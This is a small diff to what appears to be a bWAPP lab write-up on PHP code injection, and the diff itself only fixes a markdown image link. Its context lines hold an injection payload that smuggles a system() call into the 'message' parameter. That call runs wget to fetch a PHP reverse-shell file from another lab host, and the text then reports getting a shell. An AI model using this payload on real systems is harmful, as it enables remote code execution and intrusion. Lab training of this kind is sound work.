@@ -21,7 +21,7 @@ categories:
 <br><font color="Black">192.168.140.138/bWAPP/phpi.php?message="a";system("wget http://192.168.140.136/teck-nc.php -O /tmp/teck.php")</font>
 
 <br>Our file has been uploaded successfully now let’s try to trigger that file and get reverse shell.
-![42]https://teckk2.github.io/assets/images/Web%20Pentest/A1/42.png
+![42](https://teckk2.github.io/assets/images/Web%20Pentest/A1/42.png)
 <br>And we got the shell.
 
 <p class="message">
